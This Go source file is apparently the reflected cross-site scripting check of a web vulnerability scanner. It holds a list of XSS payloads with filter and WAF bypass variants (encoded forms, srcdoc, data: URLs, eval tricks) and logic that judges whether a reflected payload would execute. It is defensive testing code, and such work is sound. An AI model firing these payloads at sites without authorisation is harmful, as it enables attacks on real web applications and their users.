package active

import (
	"context"
	"net/url"
	"strings"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/payload"
)

// xssSeeds are the injection shapes worth trying, one per context a value can
// land in.
//
// Each carries the same recognisable core — `alert(document.domain)` — so a
// single judge can decide whether any of them came back executable, and so the
// evidence a reader sees is always the same obvious proof.
var xssSeeds = []string{
	// Markup contexts: the payload becomes an element.
	"<script>alert(document.domain)</script>",
	"<img src=x onerror=alert(document.domain)>",
	"<svg/onload=alert(document.domain)>",
	"<details open ontoggle=alert(document.domain)>",
	"<iframe src=javascript:alert(document.domain)>",

	// Attribute contexts. Each needs its own closing form: a value sitting in
	// double quotes is not escaped by a single one, and a value that is not
	// quoted at all is closed by whitespace. Sending only the first of these is
	// why a scanner reports the easy attributes and misses the rest.
	`" onmouseover="alert(document.domain)`,
	`" autofocus onfocus=alert(document.domain) x="`,
	`' onmouseover='alert(document.domain)`,
	`' autofocus onfocus=alert(document.domain) x='`,
	` autofocus onfocus=alert(document.domain) `,
	`javascript:alert(document.domain)`,

	// The same closures written without a space, which is what a filter that
	// blocks " onfocus=" — or that strips whitespace inside a tag — leaves open.
	// `/` separates attributes exactly as a space does, so `'a/onfocus=b'` closes
	// the value and installs the handler just as the spaced form does. The
	// handler is also spelled without `document.domain`, because a page can filter
	// that word while still echoing everything else.
	`'autofocus/onfocus=alert(document.domain)'`,
	`'autofocus/onfocus=alert(1)'`,
	`"autofocus/onfocus=alert(document.domain)"`,
	`' autofocus/onfocus=alert(document.domain) x='`,
	`<img/src=x/onerror=alert(document.domain)>`,

	// Elements whose script runs from somewhere other than the element the value
	// lands in: a nested child, a plugin host, a form button, and the animation
	// and pointer events that a filter looking for `onmouseover`/`onerror` does
	// not cover. A mutation cannot invent a tag or an event name, so each of
	// these has to be a seed.
	`<video><source onerror=alert(document.domain)>`,
	`<object data=javascript:alert(document.domain)>`,
	`<embed src=javascript:alert(document.domain)>`,
	`<form><button formaction=javascript:alert(document.domain)>x`,
	`<svg/onanimationstart=alert(document.domain)>`,
	`<img src=x onpointerover=alert(document.domain)>`,

	// Escaping the surrounding markup first, then introducing a new element.
	`"><script>alert(document.domain)</script>`,
	`'><img src=x onerror=alert(document.domain)>`,
	`</title><script>alert(document.domain)</script>`,

	// A context that decodes twice — an `srcdoc` attribute is the common one — turns
	// an entity-encoded tag back into markup on the second pass. A page that filters
	// tags by looking for `<` sees nothing to strip, and the filter and the output
	// context disagree about what the value is. Only the literal forms would miss it.
	`&lt;img src=x onerror=alert(document.domain)&gt;`,
	`&lt;svg onload=alert(document.domain)&gt;`,

	// Inside a script block, the payload has to leave the string it was written
	// into before it can run.
	`';alert(document.domain);var x='`,
	`"-alert(document.domain)-"`,
	`</script><script>alert(document.domain)</script>`,

	// Shapes that execute from a single parse of the returned document, without
	// needing the string `alert(` or a tag name a filter would have been written
	// for:
	//
	//   - the script is handed to a child document (`srcdoc`, or a `data:` URL on
	//     an `iframe`/`object`), so the outer page never contains it as markup;
	//   - the event fires by itself (`onbegin` on an animation) rather than being
	//     one of the handlers a filter lists;
	//   - `eval(src)` keeps `alert(` out of the request entirely;
	//   - `&colon;` in a URL scheme survives a filter that looks for `javascript:`.
	//
	// Deliberately absent are the bypasses that only work once something has
	// rewritten the payload: a split tag (`<sc<script>ript>`) that a replace-once
	// filter reassembles, and the `noscript`/`mglyph` chains that need a sanitiser
	// to serialise the markup and the browser to parse it again. Neither executes
	// from the single parse this check observes, so sending them would report
	// pages that are not vulnerable.
	`<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;">`,
	`<iframe src="data:text/html,<script>alert(document.domain)</script>">`,
	`<object data="data:text/html,<script>alert(document.domain)</script>">`,
	`<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>`,
	`<img src=x:alert(1) onerror=eval(src)>`,
	`<a href="javascript&colon;alert(document.domain)">x</a>`,
}

// xssReflected detects reflected cross-site scripting.
//
// The test is about *encoding*, not about a payload list: if the string that was
// sent comes back with its markup intact on a page served as HTML, a browser
// will run it. If the application escapes the value, the marker is absent and
// there is nothing to report.
//
// Mutation makes the judgement harder, and that is the point. A payload that was
// sent in an encoded form and arrives executable after the target's own decoding
// is still a finding — so the judge looks for the form the *server* would
// produce, not the form that left on the wire.
type xssReflected struct{}

func (xssReflected) ID() string                 { return "xss-reflected" }
func (xssReflected) TitleKey() i18n.Key         { return i18n.KeyCheckXSSTitle }
func (xssReflected) DescriptionKey() i18n.Key   { return i18n.KeyCheckXSSDesc }
func (xssReflected) RemediationKey() i18n.Key   { return i18n.KeyCheckXSSFix }
func (xssReflected) Severity() finding.Severity { return finding.SeverityHigh }
func (xssReflected) Tags() []string {
	return []string{"active", "injection", "xss", "owasp-top10"}
}
func (xssReflected) Passive() bool { return false }

// urlBearingAttributes are the attributes a browser follows as a URL. A `javascript:` value
// runs in these and nowhere else: the same string in `value`, `class` or `alt` is inert text
// that the browser never evaluates. Without this distinction every reflection into an
// ordinary form field reads as script execution.
var urlBearingAttributes = []string{
	"href", "src", "action", "formaction", "data", "poster", "background",
	"codebase", "cite", "longdesc", "usemap", "xlink:href", "srcdoc",
}

// inertElements are elements whose content the HTML parser treats as text, so a
// tag inside one never runs.
var inertElements = []string{"textarea", "title", "xmp", "noscript", "noframes"}

// executableContext reports whether any occurrence of marker in body is
// somewhere a browser would parse it as markup.
//
// Every occurrence is examined, not only the first. A page commonly echoes the
// value twice — once in "no results for …" prose and again in the form field it
// came from — and it is the second one that executes. Stopping at the first is
// how a payload that landed in an attribute gets read as inert.
//
// The test at each occurrence is structural, not lexical. A payload is
// neutralised when the parser is already inside something that swallows markup
// — a comment, a text-only element — or when it sits inside a tag without
// ending the value it was written into, where "<" is just a character. Deciding
// this needs no rendering engine: it needs only to look at what the document has
// open at that point, which is what an HTML parser would be doing anyway.
func executableContext(body, marker string) bool {
	if marker == "" {
		return false
	}
	for offset := 0; offset <= len(body)-len(marker); {
		index := strings.Index(body[offset:], marker)
		if index < 0 {
			return false
		}
		index += offset
		if executableAt(body[:index], marker) {
			return true
		}
		offset = index + len(marker)
	}
	return false
}

// executableAt reports whether a payload placed at the end of before — the text
// that precedes it in the document — is somewhere a browser parses as markup.
func executableAt(before, marker string) bool {
	// Inside an unterminated comment, nothing that follows is parsed.
	if strings.LastIndex(before, "<!--") > strings.LastIndex(before, "-->") {
		return false
	}

	// Inside a text-only element, tags are text.
	lowerBefore := strings.ToLower(before)
	for _, name := range inertElements {
		open := strings.LastIndex(lowerBefore, "<"+name)
		if open >= 0 && strings.LastIndex(lowerBefore, "</"+name) < open {
			return false
		}
	}

	inTag := strings.LastIndex(before, "<") > strings.LastIndex(before, ">")

	// A payload that closes the value it landed in — a leading quote, a stray
	// `>` — is read as the end of that attribute, so everything after it is
	// parsed as attributes of the tag itself. That is how an event handler gets
	// installed, and it holds whether or not the payload also carries markup
	// characters: `' autofocus onfocus=alert(1) x='` carries none, and it is the
	// form a page that escapes `<`, `>` and `"` but not `'` leaves open.
	if inTag && closesAttributeValue(marker) {
		return true
	}

	// A payload carrying no markup characters and closing nothing cannot create an
	// element. The `javascript:` forms are like this: they do nothing in a text
	// node and only run when they land in a URL-bearing attribute, so their being
	// present in the body is not evidence of anything — and neither is their
	// presence in an ordinary attribute, which is where a search term echoed into
	// a form field ends up.
	if !strings.ContainsAny(marker, "<>") {
		return inTag && inURLBearingAttribute(before)
	}

	// With markup characters and no attribute closed: inside a tag the parser is
	// reading a value, so the markup is inert text there, and outside one it is
	// parsed as markup — provided it opens an element. Closing tags on their own
	// are dropped by the parser and run nothing, which is exactly what survives a
	// filter that removes the opening tag: `<script>alert(1)</script>` filtered to
	// `alert(1)</script>` is inert, and calling it executable would be a false
	// positive on every page that strips tags.
	if !inTag {
		return opensElement(marker)
	}
	return false
}

// opensElement reports whether the payload starts an element, which is the only
// way a string sitting in a text node becomes markup.
func opensElement(marker string) bool {
	for index := 0; index+1 < len(marker); index++ {
		if marker[index] != '<' {
			continue
		}
		switch c := marker[index+1]; {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z':
			return true
		}
	}
	return false
}

// closesAttributeValue reports whether a payload begins by ending the attribute
// value it was written into, which turns the rest of it into tag attributes.
func closesAttributeValue(marker string) bool {
	switch {
	case strings.HasPrefix(marker, `"`), strings.HasPrefix(marker, `'`),
		strings.HasPrefix(marker, ">"), strings.HasPrefix(marker, "/>"):
		return true
	}
	return false
}

// describeContext names where the payload landed, for the evidence. It prefers
// the first occurrence that actually executes, so the sentence a reader sees
// agrees with the finding rather than with some other echo of the same value;
// when nothing executes, it describes where the value did land.
func describeContext(body, marker string) string {
	if marker == "" {
		return "unknown"
	}
	first := strings.Index(body, marker)
	if first < 0 {
		return "unknown"
	}
	for offset := 0; offset <= len(body)-len(marker); {
		index := strings.Index(body[offset:], marker)
		if index < 0 {
			break
		}
		index += offset
		if executableAt(body[:index], marker) {
			return describeAt(body[:index], marker)
		}
		offset = index + len(marker)
	}
	return describeAt(body[:first], marker)
}

// describeAt names the place a payload sits, given the text that precedes it.
func describeAt(prefix, marker string) string {
	before := strings.ToLower(prefix)
	if strings.LastIndex(before, "<script") > strings.LastIndex(before, "</script") {
		return "inside a script block"
	}
	if lastOpen, lastClose := strings.LastIndex(before, "<"), strings.LastIndex(before, ">"); lastOpen > lastClose {
		// Which of the two it is decides whether the payload can do anything, so the
		// evidence says which. A value inside an attribute is inert until something
		// closes that attribute first.
		if strings.HasPrefix(marker, "\"") || strings.HasPrefix(marker, "'") ||
			strings.HasPrefix(marker, ">") || strings.HasPrefix(marker, "/>") {
			return "in an attribute, after closing it"
		}
		if inURLBearingAttribute(before) {
			return "in a URL-bearing attribute"
		}
		return "inside an attribute value"
	}
	return "in the document body"
}

// inURLBearingAttribute reports whether the attribute whose value the payload landed in is
// one a browser follows as a URL.
func inURLBearingAttribute(before string) bool {
	open := strings.LastIndex(before, "<")
	if open < 0 {
		return false
	}
	tag := before[open+1:]
	space := strings.IndexAny(tag, " \t\n\r")
	if space < 0 {
		return false
	}
	// The attribute being read is the one whose `=` precedes the payload.
	equals := strings.LastIndex(tag, "=")
	if equals < 0 {
		return false
	}
	head := strings.TrimRight(tag[:equals], " \t\n\r")
	end := len(head)
	for end > 0 {
		if c := head[end-1]; c == ' ' || c == '\t' || c == '\n' || c == '\r' {
			break
		}
		end--
	}
	name := head[end:]
	for _, attribute := range urlBearingAttributes {
		if name == attribute {
			return true
		}
	}
	return false
}

func (xssReflected) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	// Only HTML responses can carry script: a JSON endpoint echoing the value is
	// reflected input, not cross-site scripting.
	if ct := t.Response.ContentType(); ct != "text/html" && ct != "application/xhtml+xml" && ct != "" {
		return nil
	}

	baseline := string(t.Response.Body)
	c.ProbeWAF(ctx, t)

	var (
		reflected string
		context   string
	)
	attempt, err := c.SendVariants(ctx, t, payload.XSS, "xss-reflected", xssSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, variant payload.Variant) bool {
			candidate := wireDecoded(variant.Value)
			if candidate == "" || !strings.Contains(string(resp.Body), candidate) {
				return false
			}
			// If the marker was already in the baseline, this page is not
			// echoing our input, it simply contains that string.
			if strings.Contains(baseline, candidate) {
				return false
			}
			// Being present is not the same as being executable. A payload
			// printed inside a comment, a textarea or an attribute value has
			// been neutralised by the page's structure whatever it says, and
			// reporting it is the difference between a scanner people run and a
			// scanner people stop running.
			if !executableContext(string(resp.Body), candidate) {
				return false
			}
			reflected = candidate
			context = describeContext(string(resp.Body), candidate)
			return true
		})
	if err != nil || attempt == nil {
		// Nothing came back from a parameter. A route that echoes the value it was addressed by
		// is the same reflection with the value written in the path, and that value is just as
		// much the caller's.
		if f := xssPathReflection(ctx, c, t, baseline); f != nil {
			return []*finding.Finding{f}
		}
		return nil
	}

	f := checks.NewFinding(xssReflected{}, t,
		i18n.KeyCheckXSSTitle, i18n.KeyCheckXSSDesc, i18n.KeyCheckXSSFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-79"
	f.References = []string{
		"https://owasp.org/www-community/attacks/xss/",
		"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
		"https://cwe.mitre.org/data/definitions/79.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{
		c.Bundle.T(i18n.KeyEvidenceReflect, reflected),
		"the payload landed outside every inert context and is parsed as markup: " + context,
		variantNote(c, attempt),
	}
	f.Evidence.Diff = extractAround(string(attempt.Response.Body), reflected, 240)
	return []*finding.Finding{f}
}

// wireDecoded returns the form a payload ends up in after the target has finished
// decoding it.
//
// It is what the judge has to look for, and it has to peel every layer the
// mutation added. A doubly-encoded variant (`%253Cscript%253E`) leaves the
// filter reading `%3Cscript%3E` and reaches the application as `<script>`, so
// looking for either the sent string or a single decode would report nothing
// exactly when the evasion worked.
//
// Stopping at the first layer that does not change is also what keeps the test
// honest: if the response only ever contains the still-encoded form, the payload
// never became markup and there is nothing to report.
func wireDecoded(value string) string {
	decoded := value
	for layer := 0; layer < 4; layer++ {
		next, err := url.QueryUnescape(decoded)
		if err != nil || next == decoded {
			break
		}
		decoded = next
	}
	if decoded == "" {
		return value
	}
	return decoded
}

// xssPathReflection sends the markup seeds as part of the path.
//
// A route that prints the segment it was addressed by — "Hello, <name>", a breadcrumb, a 404
// that names what was asked for — writes a value the caller chose straight into the page. No
// parameter check reaches it. The judgement is the same one the parameter walk uses and needs no
// adjustment for it: the payload has to arrive whole, it has to be new to the page, and it has
// to be in a context where markup is parsed. A page that escapes the segment writes
// `&lt;script&gt;` and fails the first or the third of those, which is the difference between a
// reflection and a finding.
//
// Both ways of writing it are tried, because a route may take the value as the last segment or
// leave room for one after it, and a path that merely does not exist is answered with the same
// page as any other name would be.
func xssPathReflection(ctx context.Context, c *checks.Context, t *checks.Target, baseline string) *finding.Finding {
	limit := xssPathSeeds
	if limit > len(xssSeeds) {
		limit = len(xssSeeds)
	}
	for _, seed := range xssSeeds[:limit] {
		for _, inPlace := range []bool{true, false} {
			request, ok := withPathPayload(t.Request, seed, inPlace)
			if !ok {
				continue
			}
			response, err := c.Do(ctx, request)
			if err != nil || response == nil || response.Status >= 400 {
				continue
			}
			candidate := wireDecoded(seed)
			if candidate == "" || !strings.Contains(string(response.Body), candidate) {
				continue
			}
			if strings.Contains(baseline, candidate) {
				continue
			}
			if !executableContext(string(response.Body), candidate) {
				continue
			}

			where := "appended to the path"
			if inPlace {
				where = "in place of the last path segment"
			}
			f := checks.NewFinding(xssReflected{}, t,
				i18n.KeyCheckXSSTitle, i18n.KeyCheckXSSDesc, i18n.KeyCheckXSSFix)
			f.Severity = finding.SeverityHigh
			f.Confidence = finding.ConfidenceCertain
			f.Payload = seed + " (" + where + ")"
			f.CWE = "CWE-79"
			f.References = []string{
				"https://owasp.org/www-community/attacks/xss/",
				"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
				"https://cwe.mitre.org/data/definitions/79.html",
			}
			f.Evidence.Request = request.Raw()
			f.Evidence.Response = truncate(response.Body, 8192)
			f.Evidence.Baseline = truncate(t.Response.Body, 4096)
			f.Evidence.Matches = []string{
				c.Bundle.T(i18n.KeyEvidenceReflect, candidate),
				"the payload landed outside every inert context and is parsed as markup: " +
					describeContext(string(response.Body), candidate),
				"the value came from the path, which the caller writes as freely as a parameter",
			}
			f.Evidence.Diff = extractAround(string(response.Body), candidate, 240)
			return f
		}
	}
	return nil
}

// xssPathSeeds bounds how many markup shapes are tried through the path. Each one costs two
// requests, and the first few cover the markup contexts a page can put a value into.
const xssPathSeeds = 6
